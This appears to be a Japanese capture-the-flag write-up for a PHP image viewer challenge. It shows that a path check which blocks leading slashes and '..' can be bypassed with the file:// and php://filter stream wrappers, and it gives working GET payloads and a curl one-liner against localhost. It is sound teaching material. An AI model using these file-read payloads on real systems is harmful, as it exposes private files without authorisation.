---
title: Writeup for "Alpaca Rangers"
date: 2026-02-19
tags: [writeup, php, lfi]
summary: "Alpaca RangersのWriteupです。"
---

# Alpaca Rangers - Writeup

## 概要

PHP製の画像ビューアアプリ。`img` クエリパラメータで指定したファイルを `file_get_contents()` で読み込み、Base64エンコードして `<img>` タグの Data URI として表示する。

フラグは `/flag.txt` に配置されている。

## ソースコード分析

### バリデーション (index.php 9行目)

```php
if (str_starts_with($targetPath, '/') || str_starts_with($targetPath, '\\') || str_contains($targetPath, '..')) {
    $errorMessage = 'Invalid path.';
}
```

以下の3つをチェックしている:

1. `/` で始まるか（絶対パスの拒否）
2. `\` で始まるか
3. `..` を含むか（ディレクトリトラバーサルの拒否）

### ファイル読み込み (index.php 12行目)

```php
$contents = @file_get_contents($targetPath);
```

`file_get_contents()` はPHPストリームラッパーをサポートしており、`file://`、`php://` などのスキームを受け付ける。

## 脆弱性

バリデーションはパスの先頭文字と `..` の有無しかチェックしていないため、PHPストリームラッパーを使えばバイパスできる。

`file:///flag.txt` は:

- `/` で始まらない（`f` で始まる） → チェック1を通過
- `\` で始まらない → チェック2を通過
- `..` を含まない → チェック3を通過

しかし `file_get_contents()` は `file://` スキームとして解釈し、`/flag.txt` の内容を読み取る。

## 解法

```
GET /?img=file:///flag.txt
```

レスポンス中の Data URI からBase64部分をデコードするとフラグが得られる。

```bash
curl -s 'http://localhost:3000/?img=file:///flag.txt' | grep -oP 'base64,\K[^"]+' | base64 -d
```

### 別解

`php://filter` ラッパーでも同様にバイパス可能:

```
GET /?img=php://filter/resource=/flag.txt
```
